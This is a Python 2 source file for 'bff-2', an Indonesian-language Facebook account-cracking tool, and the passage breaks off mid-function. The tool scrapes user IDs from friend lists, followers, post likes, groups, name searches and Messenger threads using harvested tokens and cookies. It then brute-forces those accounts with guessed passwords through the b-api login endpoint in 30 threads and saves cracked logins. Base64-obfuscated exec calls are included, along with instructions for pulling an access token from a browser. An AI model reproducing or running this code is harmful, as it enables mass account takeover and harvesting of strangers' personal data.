# coding=utf-8
# coding by Romi Afrizal
# Note : jangan di ubah lagi! nanti error, script udah enak

# Open source code team
# Sekedar mengingatkan kalau mau decrypt script ini jangan salahin gw, jika semua data-data di hp (handphone) lu hilang (terhapus)

Hj = '\x1b[1;92m' 
Mt = '\x1b[0m' 
ingfo = (
"""%s
 • Info script :
 	
 - author      : Romi Afrizal
 - facebook    : facebook.com/romi.afrizal.102
 - fanspage    : facebook.com/100022086172556
 - whatsap     : +6282371648186
 - github      : github.com/Mark-Zuck
 - script name : bff-2
 - version     : 1.1
 
%s"""%(Hj,Mt))

import os
try:
    import requests
except ImportError:
    print '\n• modul requests belum terinstall \n'
    os.system('pip2 install requests')
try:
    import concurrent.futures
except ImportError:
    print '\n• modul futures belum terinstall \n'
    os.system('pip2 install futures')
try:
    import bs4
except ImportError:
    print '\n• modul bs4 belum terinstall \n'
    os.system('pip2 install bs4')

import requests, os, re, bs4, sys, json, time, random, datetime, subprocess, logging, base64, marshal
from concurrent.futures import ThreadPoolExecutor as Lampung
from datetime import datetime
from bs4 import BeautifulSoup as parser
from time import sleep as jeda
exec(base64.b64decode('Y3QgPSBkYXRldGltZS5ub3coKQ0KbiA9IGN0Lm1vbnRoDQpidWxhbjEgPSB7IjAxIjogIkphbnVhcmkiLCAiMDIiOiAiRmVicnVhcmkiLCAiMDMiOiAiTWFyZXQiLCAiMDQiOiAiQXByaWwiLCAiMDUiOiAiTWVpIiwgIjA2IjogIkp1bmkiLCAiMDciOiAiSnVsaSIsICIwOCI6ICJBZ3VzdHVzIiwgIjA5IjogIlNlcHRlbWJlciIsICIxMCI6ICJPa3RvYmVyIiwgIjExIjogIk5vdmVtYmVyIiwgIjEyIjogIkRlc2VtYmVyIn0NCmJ1bGFuID0gWydKYW51YXJpJywgJ0ZlYnJ1YXJpJywgJ01hcmV0JywgJ0FwcmlsJywgJ01laScsICdKdW5pJywgJ0p1bGknLCAnQWd1c3R1cycsICdTZXB0ZW1iZXInLCAnT2t0b2JlcicsICdOb3ZlbWJlcicsICdEZXNlbWJlciddDQp0cnk6DQogICAgaWYgbiA8IDAgb3IgbiA+IDEyOg0KICAgICAgICBleGl0KCkNCiAgICBuVGVtcCA9IG4gLSAxDQpleGNlcHQgVmFsdWVFcnJvcjoNCiAgICBleGl0KCkNCg0KY3VycmVudCA9IGRhdGV0aW1lLm5vdygpDQp0YSA9IGN1cnJlbnQueWVhcg0KYnUgPSBjdXJyZW50Lm1vbnRoDQpoYSA9IGN1cnJlbnQuZGF5DQpvcCA9IGJ1bGFuW25UZW1wXQ0KcmVsb2FkKHN5cykNCnN5cy5zZXRkZWZhdWx0ZW5jb2RpbmcoJ3V0Zi04JykNCiMgS1VNUFVMQU4gV0FSTkENCk0gPSAnXHgxYlsxOzkxbScgIyBNRVJBSA0KSCA9ICdceDFiWzE7OTJtJyAjIEhJSkFVDQpLID0gJ1x4MWJbMTs5M20nICMgS1VOSU5HDQpCID0gJ1x4MWJbMTs5NG0nICMgQklSVQ0KVSA9ICdceDFiWzE7OTVtJyAjIFVOR1UNCk8gPSAnXHgxYlsxOzk2bScgIyBCSVJVIE1VREENClAgPSAnXHgxYlsxOzk3bScgIyBQVVRJSA0KTiA9ICdceDFiWzBtJyAjIFdBUk5BIE1BVEkNCmFjYWsgPSBbTSwgSCwgSywgQiwgVSwgTywgUF0NCndhcm5hID0gcmFuZG9tLmNob2ljZShhY2FrKQ0KdGlsID0i4oCiIg=='))

ok = []
cp = []
id = []
user = []
loop = 0

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush();jeda(0.03)

def tik():
    titik = ['.   ','..  ','... ']
    for o in titik:
        print ('\r%s%s menghapus %s'%(M,til,o)),
        sys.stdout.flush();jeda(1)
        
# LOGO (LO GOBLOK)
ip = requests.get('https://api.ipify.org').text
exec(base64.b64decode('YXV0aG9yID0iUm9taSBBZnJpemFsIgpmYl9tZSA9ImZhY2Vib29rLmNvbS9yb21pLmFmcml6YWwuMTAyIgpnaXRodWIgPSJnaXRodWIuY29tL01hcmstWnVjayI='))
def banner():
    print (' %s%s%s%s%s%s                                      %s%s%s%s%s%s\n%s   _______  ______ _______ _______ _     _\n   |       |_____/ |_____| |       |____/ \n%s   |_____  |    \\_ |     | |_____  |    \\_\n\n     %s    %s %sCoded by %s: %s%s %s%s   \n %s%s%s%s%s%s                                      %s%s%s%s%s%s \n %s# %sFb  %s : %s%s \n %s# %sGit%s  : %s%s \n %s# %s---------------------------------------- %s#  '%
    (M,til,K,til,H,til,M,til,K,til,H,til,M,P,U,til,K,M,K,author,U,til,M,til,K,til,H,til,M,til,K,til,H,til,U,O,M,O,fb_me,U,O,M,O,github,P,M,P))
    print (' %s#%s IP   %s:%s %s%s '%(U,O,M,O,ip,M))
    
# MASUK TOKEN (TOKEN LISTRIK)
header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+ ;]", "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
def masuk():
    os.system('clear');banner()
    print ('\n%s%s%s 01 %sLogin via token \n%s%s%s 02%s Cara mendapatkan token \n%s%s%s 00 %sKeluar'%(U,til,K,O,U,til,K,O,U,til,M,O))
    rom = raw_input ("\n%s# %sPilih %s> %s"%(P,O,M,K))
    if rom in(""):
    	print("%s%s wrong input "%(M,til));exit()
    elif rom in ('1','01'):
        jalan("\n%s!%s Wajib gunakan akun tumbal dilarang akun utama"%(M,O))
    	romz = raw_input("%s# %sToken %s> %s"%(P,O,M,K))
        if romz in(""):
        	print ("%s%s isi token kentod "%(M,til))
    	try:
            nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(romz)).json()['name']
            print ('\n%s%s Login succes, mohon tunggu '%(H,til));jeda(2)
            open('data/token.txt', 'w').write(romz);login_xx()
            exec(base64.b64decode('b3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vcm9taS5hZnJpemFsLjEwMicpO21lbnUoKQ=='))
        except (KeyError,IOError):
        	print ("%s%s Token invalid "%(M,til));jeda(2);masuk()
    elif rom in ('2', '02'):
    	print ("\n%s%s Berikut cara nya :"%(H,til));jeda(2)
        print (" - siapkan akun facebook (wajib akun tumbal)");jeda(2)
        print (" - loginkan akun facebook (tumbal) di browser %sChrome %s"%(O,H));jeda(2)
        print (" - url alamat wajib %shttps://m.facebook.com %s(mode data)"%(O,H));jeda(2)
        print (" - salin link : %shttps://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_"%(O));jeda(2)
        print ("%s - taruh link tersebut di url alamat facebook lalu klik cari "%(H));jeda(2)
        print (" - jika sudah, klik %stitik tiga %spojok kanan atas "%(O,H));jeda(2)
        print (" - kemudian klik %sCari di Halaman %s"%(O,H));jeda(2)
        print (" - ketik %sEAAAA %sakan muncul acces token."%(O,H));jeda(2)
        print (" - jika sudah jangan lupa di salin \n");jeda(2)
        nanya = raw_input('%s%s%s Anda paham? %sy%s/%sn :%s '%(U,til,O,H,O,M,K))
        if nanya in(""):
        	print ("%s%s saya bertanya wajib di jawab "%(M,til));jeda(2);masuk()
        elif nanya in("y","Y"):
        	print ("\n%s%s selamat anda pintar :* "%(H,til));jeda(2);masuk()
        elif nanya in("n","N"):
        	print ("\n%s%s anda sungguh tolol "%(M,til));jeda(2);os.system("xdg-open https://youtu.be/IG5QfdxRkeY");masuk()
    elif rom in ('0', '00'):
    	exit('\n')
    else:
    	print("%s%s wrong input "%(M,til));exit()
    
# MASUK COOKIE (KUEH KERING)
host = ('https://mbasic.facebook.com')
ua = ("NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+")
h = {'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}

def __romz__():
	if os.path.exists(".cok"):
		if os.path.getsize(".cok") !=0:
			return cvd(open('.cok').read().strip())
		else:gen()
	else:gen()
  
def gen(show=True):
	if show==True:
		#os.system("clear")
		#banner()
		print("\n%s%s%s Supaya bekerja masukan cookie facebook anda"%(U,til,O))
	ck=raw_input("%s# %sCookie %s> %s"%(P,O,M,K))
	if ck=="":gen(show=False)
	try:
		cks=cvd(ck)
		if lang(cks)==True:
			open(".cok","w").write(ck);exit("%s%s login success, ketik: python2 bff-2.py "%(H,til))
		else:print("%s%s login gagal."%(M,til));gen(show=True)
	except Exception as e:
		print("%s%s error : %s\n"%(M,til,e))
		gen(show=False)
		
def lang(cookies):
	f=False
	b=requests.get("https://mbasic.facebook.com/profile.php",headers={'origin': 'https://mbasic.facebook.com', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'accept-encoding': 'gzip, deflate', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'user-agent': ua, 'Host': ('').join(bs4.re.findall('://(.*?)$', 'https://mbasic.facebook.com')), 'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'content-type': 'application/x-www-form-urlencoded'},cookies=cookies).text	
	if "mbasic_logout_button" in b.lower():
		f=True
		if f==True:
			return True
		else:
				exit("%s%s login gagal. "%(M,til))
				
def hdcok():
    hosts = host
    r = {'origin': hosts, 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'accept-encoding': 'gzip, deflate', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'user-agent': ua, 'Host': ('').join(bs4.re.findall('://(.*?)$', hosts)), 'referer': hosts + '/login/?next&ref=dbl&fl&refid=8', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'content-type': 'application/x-www-form-urlencoded'}
    return r

def cvs(cookies): # convert cookie dict to string
	result=[]
	for i in enumerate(cookies.keys()):
		if i[0]==len(cookies.keys())-1:result.append(i[1]+"="+cookies[i[1]])
		else:result.append(i[1]+"="+cookies[i[1]]+"; ")
	return "".join(result)
	
def cvd(cookies): # convert cookie dict to string
	result={}
	try:
		for i in cookies.split(";"):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
	except:
		for i in cookies.split("; "):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result

# DUMP PUBLIK
def publik(romz,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	print ("\n%s%s %sKetik '%sme%s' jika ingin dump daftar teman sendiri "%(U,til,O,H,O))
        idt = raw_input('%s%s %sTarget id%s > %s'%(U,til,O,M,K))
        #simpan = raw_input('%s%s%s Nama file%s > %s'%(U,til,O,M,K))
        gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,romz))
        nm = json.loads(gas.text)
        file = ('dump/'+nm['first_name']+'.json').replace(' ', '_')
        bff = open(file, 'w')
        r = requests.get('https://graph.facebook.com/%s?fields=friends.limit(5001)&access_token=%s'%(idt,romz))
        z = json.loads(r.text)
        for a in z['friends']['data']:
            id.append(a['id'] + '<=>' + a['name'])
            bff.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r%s%s%s mengumpulkan id%s >%s %s ' % (U,til,O,M,H,str(len(id))),
            sys.stdout.flush();jeda(0.0050)

        bff.close()
        print ('\n\n%s%s Succes dump id dari %s'%(H,til,nm['name']))
        print ('%s%s%s File dump tersimpan %s>%s %s '%(U,til,O,M,H,file))
        raw_input('\n%s%s%s Kembali '%(U,til,O))
        menu()
    except Exception as e:
        exit('\n%s%s Failed dump id'%(M,til))

# DUMP FOLLOWERS
def followers(romz,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	print ("\n%s%s %sKetik '%sme%s' jika ingin dump followers sendiri "%(U,til,O,H,O))
        idt = raw_input('%s%s %sTarget id%s  > %s'%(U,til,O,M,K))
        batas = raw_input('%s%s %sMaximal id%s > %s'%(U,til,O,M,K))
        #simpan = raw_input('%s%s%s Nama file%s  > %s'%(U,til,O,M,K))
        gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,romz))
        nm = json.loads(gas.text)
        file = ('dump/'+nm['first_name']+'.json').replace(' ', '_')
        bff = open(file, 'w')
        r = requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s'%(idt,batas,romz))
        z = json.loads(r.text)
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            bff.write(a['id'] + '<=>' + a['name'] + '\n')
            print ('\r%s%s%s mengumpulkan id%s >%s %s ' % (U,til,O,M,H,str(len(id)))),
            sys.stdout.flush();jeda(0.0050)

        bff.close()
        print ('\n\n%s%s Succes dump followers dari %s '%(H,til,nm["name"]))
        print ('%s%s%s File dump tersimpan %s>%s %s '%(U,til,O,M,H,file))
        raw_input('\n%s%s%s Kembali '%(U,til,O))
        menu()
    except Exception as e:
        exit('\n%s%s Failed dump id'%(M,til))
  
# DUMP POSTINGAN 
def postingan(romz,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	print ("\n%s%s %sPerlu di ingat postingan harus bersifat publik "%(U,til,O))
        idt = raw_input('%s%s %sId post%s   > %s'%(U,til,O,M,K))
        simpan = raw_input('%s%s%s Nama file%s > %s'%(U,til,O,M,K))
        r = requests.get('https://graph.facebook.com/%s/likes?limit=999999&access_token=%s'%(idt,romz))
        id = []
        z = json.loads(r.text)
        file = ('dump/' + simpan + '.json').replace(' ', '_')
        bff = open(file, 'w')
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            bff.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r%s%s%s mengumpulkan id%s >%s %s ' % (U,til,O,M,H,str(len(id))),
            sys.stdout.flush();jeda(0.0050)

        bff.close()
        print ('\n\n%s%s Succes dump id postingan '%(H,til))
        print ('%s%s%s File dump tersimpan %s>%s %s '%(U,til,O,M,H,file))
        raw_input('\n%s%s%s Kembali '%(U,til,O))
        menu()
    except Exception as e:
        exit('\n%s%s Failed dump id'%(M,til))

# DUMP GROUP
class group:
	
	def __init__(self, cookies):
		self.glist=[]
		self.cookies=cookies
		self.manual()
		exit()
		
	def manual(self):
		print("\n%s%s%s Perlu di ingat group harus bersifat publik atau wajib join group"%(U,til,O))
		id=raw_input("%s%s%s Id groups%s > %s"%(U,til,O,M,K))
		if id in(""):
			self.manual()
		else:
			r=bs4.BeautifulSoup(requests.get("https://mbasic.facebook.com/groups/"+id,headers=hdcok(),cookies=self.cookies).text,"html.parser")
			if "konten tidak" in r.find("title").text.lower():
				exit("%s%s input id grup yg valid goblok, id error, atau lu belom jooin di grup"%(M,til))
			else:
				self.listed={"id":id,"name":r.find("title").text}
				self.f()
				print("%s%s%s Nama grup%s > %s%s.."%(U,til,O,M,H,self.listed.get("name")[0:20]))
				self.dumps("https://mbasic.facebook.com/groups/"+id)
	
	def f(self):
		self.fl=raw_input('%s%s%s Nama file %s> %s'%(U,til,O,M,K)).replace(" ","_")
		if self.fl=='':self.f()
		open(self.fl,"w").close()
	
	def dumps(self, url):
		r=bs4.BeautifulSoup(requests.get(url,cookies=self.cookies,headers=hdcok()).text,"html.parser")
		print("\r%s%s%s mengumpulkan id %s> %s%s \x1b[1;97m- mohon tunggu\r"%(U,til,O,M,H,str(len(open(self.fl).read().splitlines()))))
		sys.stdout.flush();jeda(0.0050)
		for i in r.find_all("h3"):
			try:
				if len(bs4.re.findall("\/",i.find("a",href=True).get("href")))==1:
					ogeh=i.find("a",href=True)
					if "profile.php" in ogeh.get("href"):
						a="".join(bs4.re.findall("profile\.php\?id=(.*?)&",ogeh.get("href")))
						if len(a)==0:continue
						elif a in open(self.fl).read():
							continue
						else:
							open(self.fl,"a+").write("%s<=>%s\n"%(a,ogeh.text))
							continue
					else:
						a="".join(bs4.re.findall("/(.*?)\?",ogeh.get("href")))
						if len(a)==0:continue
						elif a in open(self.fl).read():
							continue
						else:
							open(self.fl,"a+").write("%s<=>%s\n"%(a,ogeh.text))
			except:continue
		for i in r.find_all("a",href=True):
			if "Lihat Postingan Lainnya" in i.text:
				while True:
					try:
						self.dumps("https://mbasic.facebook.com/"+i.get("href"))
						break
					except Exception as e:
						print("\r\x1b[1;91m•%s, retrying..."%e);continue
		print ('\n\n%s%s Succes dump id member group '%(H,til));print ('%s%s%s File dump tersimpan %s>%s %s '%(U,til,O,M,H,self.fl));raw_input("\n%s%s%s kembali"%(U,til,O));menu()

def cek(arg):
	if os.path.exists(".cok"):
		if os.path.getsize(".cok") !=0:
			return True
		else:return False
	else:return False

# DUMP PENCARIAN NAMA
def dumpfl():
    cvds = None
    cookie = None
    new = None
    if cek(1) == False:
        try:
            cookie = raw_input("\n%s%s%s Supaya bekerja masukan cookie facebook anda\n%s# %sCookie%s > %s"%(U,til,O,P,O,M,K))
            cvds = cvd(cookie)
            new = True
        except:
            print("\x1b[1;91m• invalid cookie");dumpfl()
    else:
        cvds = cvd(open('.cok').read().strip())
    r = requests.get('https://mbasic.facebook.com/profile.php', cookies=cvds, headers=hdcok()).text
    if len(bs4.re.findall('logout', r)) != 0:
        if lang(cvds) != True:
            exit("%s%s gagal saat mendeteksi bahasa."%(M,til))
        #print("\n%s%s%s Login sebagai%s [ %s%s..]"%(U,til,O,M,H,bs4.BeautifulSoup(r,"html.parser").find("title").text[0:10]))
        if new == True:
            open('.cok', 'w').write(cookie)
        sim=raw_input("\n%s%s%s Nama file %s>%s "%(U,til,O,M,K)).replace(" ","_")
        print ("%s%s%s Example nama orang %s[ %sRomi Ganteng %s]"%(U,til,O,P,H,P))
        s=raw_input("%s%s%s Sett nama %s> %s"%(U,til,O,M,K))
        if s in("romi","Romi","ROMI","Romi Afrizal","Romi afrizal","ROMI AFRIZAL","romi afrizal"):
        	print("\n%s%s anak anjing mau crack pake nama gw "%(M,til));exit()
        elif s in("Romi Ganteng","Romi ganteng","ROMI GANTENG","romi ganteng"):
        	print ("\n%s%s memang ganteng dong abang Romi"%(H,til));exit()
        namah(sim,cvds,"https://mbasic.facebook.com/search/people/?q="+s)
    else:
        try:
            os.remove('.cok')
        except:
            pass
        print '\x1b[1;91m• login fail!'
        dumpfl()
    return

def namah(sim,r,b):
	open(sim,"a+")
	b=bs4.BeautifulSoup(requests.get(b, cookies=r,headers=hdcok()).text,"html.parser")
	for i in b.find_all("a",href=True):
		#clear()
		#banner()
		print("\r%s%s%s mengumpulkan id %s> %s%s \x1b[1;97m- mohon tunggu\r"%(U,til,O,M,H,str(len(open(sim).read().splitlines())))),;sys.stdout.flush()
		if "<img alt=" in str(i):
			if "home.php" in str(i["href"]):
				continue
			else:
				g=str(i["href"])
				if "profile.php" in g:
					name=i.find("img").get("alt").replace(", profile picture","")
					d=bs4.re.findall("/profile\.php\?id=(.*?)&",g)
					if len (d) !=0:
						pk="".join(d)
						if pk in open(sim).read():
							pass
						else:
							open(sim,"a+").write("%s<=>%s\n"%(pk,name))
				else:
					d=bs4.re.findall("/(.*?)\?",g)
					name=i.find("img").get("alt").replace(", profile picture","")
					if len(d) !=0:
						pk="".join(d)
						if pk in open(sim).read():
							pass
						else:
							open(sim,"a+").write("%s<=>%s\n"%(pk,name))
		if "Lihat Hasil Selanjutnya" in i.text:
			namah(sim,r,i["href"])
	print ('\n\n%s%s Succes dump id pencarian nama '%(H,til));print ('%s%s%s File dump tersimpan %s>%s %s '%(U,til,O,M,H,sim));raw_input("\n%s%s%s kembali"%(U,til,O));menu()

# DUMP PESAN
class pesan:

    def __init__(self, cookies):
        self.cookies = cookies
        #basecookie()
        #clear()        
        self.f = raw_input('\n%s%s%s Nama file%s >%s '%(U,til,O,M,K)).replace(' ', '_')
        if self.f == '':
            pesan(cookies)
        open(self.f, 'w').close()
        self.dump('https://mbasic.facebook.com/messages')

    def dump(self,url):
    	open(self.f, 'a+')
        bs = bs4.BeautifulSoup(requests.get(url, headers=hdcok(), cookies=self.cookies).text, 'html.parser')
        print ("\r%s%s%s mengumpulkan id %s> %s%s \x1b[1;97m- mohon tunggu\r"%(U,til,O,M,H,str(len(open(self.f).read().splitlines()))));sys.stdout.flush();jeda(0.0050)
        for i in bs.find_all('a', href=True):
            if '/messages/read' in i.get('href'):
                f = bs4.re.findall('cid\\.c\\.(.*?)%3A(.*?)&', i.get('href'))
                try:
                    for ip in list(f.pop()):
                        if self.cookies.get(' c_user') in ip:
                            continue
                        else:
                            if 'pengguna facebook' in i.text.lower():
                                continue
                            open(self.f, 'a+').write('%s<=>%s\n' % (ip, i.text))
                except Exception as e:
                    continue
            if 'Lihat Pesan Sebelumnya' in i.text:
                self.dump('https://mbasic.facebook.com/' + i.get('href'))
        print ('\n%s%s Succes dump id pesan mesengger '%(H,til))
        print ('%s%s%s File dump tersimpan %s>%s %s '%(U,til,O,M,H,self.f))
        raw_input("\n%s%s%s kembali"%(U,til,O));menu()

# GANTI USER AGENT
def useragent():
	print ("\n%s%s%s 01 %sGanti user agents "%(U,til,P,O))
	print ("%s%s%s 02 %sCek user agents "%(U,til,P,O))
	print ("%s%s%s 00 %sKembali "%(U,til,M,O))
	uas()
	
def uas():
    u = raw_input('\n%s#%s Pilih%s >%s '%(P,O,M,K))
    if u == '':
        print '%s%s wrong input'%(M,til);jeda(2);uas()
    elif u in("1","01"):
    	print ("%s%s%s Ketik %sMy user agent%s di browser google chrome\n%s%s%s untuk gunakan user agent anda sendiri"%(U,til,O,H,O,U,til,O))
    	print ("%s%s%s Ketik %sdefault%s untuk gunakan user agent bawaan tools"%(U,til,O,H,O))
    	try:
    	    ua = raw_input("%s%s%s Enter user agent %s: %s"%(U,til,O,M,K))
            if ua in(""):
            	print ("%s%s isi yang benar "%(M,til));jeda(2);menu()
            elif ua in("my user agent","My User Agent","MY USER AGENT","My user agent"):
            	jalan("%s%s%s Anda akan di arahkan ke browser "%(U,til,O));jeda(2)
            	os.system("am start https://www.google.com/search?q=My+user+agent>/dev/null");jeda(2);useragent()
            elif ua in("default","Default","DEFAULT"):
            	ua_ = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"])
                open("data/ua.txt","w").write(ua_)
                print ("\n%s%s Using the built-in user agent"%(H,til));jeda(2);menu()
            open("data/ua.txt","w").write(ua);jeda(2)
            print ("\n%s%s Successfully changed user agent"%(H,til));jeda(2);menu()
        except KeyboardInterrupt:
			exit ("\x1b[1;91m• Error ") 
    elif u in("2","02"):
        try:
        	ua_ = open('data/ua.txt', 'r').read();jeda(2);print ("%s%s%s user agent anda : %s%s"%(U,til,O,H,ua_));jeda(2);raw_input("%s%s%s kembali "%(U,til,O));menu()
        except IOError:
        	ua_ = '%s-'%(M)
    elif u in("0","00"):
    	menu()
    else:
        print '%s%s wrong input'%(M,til);jeda(2);uas()

# MULAI CRACK 
class ngentod:

    def __init__(self):
        self.id = []

    def askk(self):
        try:
            self.apk = raw_input('\n%s%s%s file dump %s> %s'%(U,til,O,M,K))
            self.id = open(self.apk).read().splitlines()
            print '%s%s%s jumlah Id%s > %s%s' %(U,til,O,M,H,len(self.id))
        except:
            print ('\n%s%s file dump : %s%s%s tidak ada'%(M,til,K,self.apk,M));jeda(2);print('%s%s lu harus dump id dlu, pilih antara menu no 1-6 '%(M,til));jeda(3);menu()
        rom = raw_input('%s%s%s gunakan password manual? y/t%s > %s'%(U,til,O,M,K))
        if rom in ('Y', 'y'):
            print ('\n%s%s%s contoh%s >%s sayang%s,%spengen%s,%sngentot'%(U,til,O,M,O,M,O,M,O))
            while True:
                pwek = raw_input('%s%s%s password %s> %s'%(U,til,O,M,K))
                if pwek == '':
                    print("%s%s Jangan kosong"%(M,til))
                elif len(pwek)<=5:
                    print ('%s%s sandi minimal 6 karakter'%(M,til))
                else:
                    def xxh(xxnx=None):
                        skm = raw_input('\n%s#%s Pilih %s> %s '%(P,O,M,K))
                        if skm in(""):
                            print '%s%s isi yg benar sayang'%(M,til);self.xxh()
                        elif skm in("1","01"):
                            print '\n%s%s%s akun %s[OK] %stersimpan ke file %s> %shasil/OK-%s-%s-%s.txt'%(U,til,O,H,O,M,H,ha, op, ta);jeda(0.2)
                            print '%s%s%s akun %s[%sCP%s]%s tersimpan ke file %s> %shasil/CP-%s-%s-%s.txt'%(U,til,O,M,K,M,O,M,K,ha, op, ta);jeda(0.2)
                            print('%s!%s crack berjalan, tekan CTRL+Z untuk stop\n'%(U,O));jeda(0.2)
                            with Lampung(max_workers=30) as njir:
                                for uh in self.id:
                                    try:
                                        ah = uh.split('<=>')[0]
                                        njir.submit(self.api, ah, xxnx)
                                    except: pass
                            os.remove(self.apk)
                            exit("\n%s%s finished "%(H,til))
                        elif skm in("2","02"):
                            print '\n%s%s%s akun %s[OK] %stersimpan ke file %s> %shasil/OK-%s-%s-%s.txt'%(U,til,O,H,O,M,H,ha, op, ta);jeda(0.2)
                            print '%s%s%s akun %s[%sCP%s]%s tersimpan ke file %s> %shasil/CP-%s-%s-%s.txt'%(U,til,O,M,K,M,O,M,K,ha, op, ta);jeda(0.2)
                            print('%s!%s crack berjalan, tekan CTRL+Z untuk stop\n'%(U,O));jeda(0.2)
                            with Lampung(max_workers=30) as njir:
                                for uh in self.id:
                                    try:
                                        ah = uh.split('<=>')[0]
                                        njir.submit(self.mbasic, ah, xxnx)
                                    except: pass
                            os.remove(self.apk)
                            exit("\n%s%s finished "%(H,til))
                        elif skm in("3","03"):
                            print '\n%s%s%s akun %s[OK] %stersimpan ke file %s> %shasil/OK-%s-%s-%s.txt'%(U,til,O,H,O,M,H,ha, op, ta);jeda(0.2)
                            print '%s%s%s akun %s[%sCP%s]%s tersimpan ke file %s> %shasil/CP-%s-%s-%s.txt'%(U,til,O,M,K,M,O,M,K,ha, op, ta);jeda(0.2)
                            print('%s!%s crack berjalan, tekan CTRL+Z untuk stop\n'%(U,O));jeda(0.2)
                            with Lampung(max_workers=30) as njir:
                                for uh in self.id:
                                    try:
                                        ah = uh.split('<=>')[0]
                                        njir.submit(self.mobile, ah, xxnx)
                                    except: pass
                            os.remove(self.apk)
                            exit("\n%s%s finished "%(H,til))
                        else:
                            print '\n%s%s Isi yg benar'%(M,til);jeda(2);xxh()
                    print '\n%s%s%s [ pilih methode crack ]\n'%(U,til,O)
                    print '%s%s%s 01%s methode %sb-api%s (fast crack)'%(U,til,P,O,M,O)
                    print '%s%s%s 02%s methode %smbasic%s (slow crack)'%(U,til,P,O,P,O)
                    print '%s%s%s 03%s methode %smobile%s (very slow crack)'%(U,til,P,O,H,O)
                    xxh(pwek.split(','))
                    break
        elif rom in ('T', 't'):
            print '\n%s%s%s [ pilih methode crack ]\n'%(U,til,O)
            print '%s%s%s 01%s methode %sb-api%s (fast crack)'%(U,til,P,O,M,O)
            print '%s%s%s 02%s methode %smbasic%s (slow crack)'%(U,til,P,O,P,O)
            print '%s%s%s 03%s methode %smobile%s (very slow crack)'%(U,til,P,O,H,O)
            self.sung()
        else:
            print '\n%s%s Isi yg benar'%(M,til);jeda(2);menu()
        return

    def api(self, user, xxh):
        global ok,cp,loop
        print('\r%s%s%s [crack] %s/%s [OK-:%s]-[CP-:%s] '%(U,til,O,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in xxh:
            pw = pw.lower()
            try: os.mkdir('hasil')
            except: pass
            try:
            	ua = open('data/ua.txt', 'r').read()
            except (KeyError, IOError):
            	ua = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"])
            headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
            response = requests.get("https://b-api.facebook.com/method/auth.login?format=json&email="+user+"&password="+pw+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
            if response.status_code != 200:
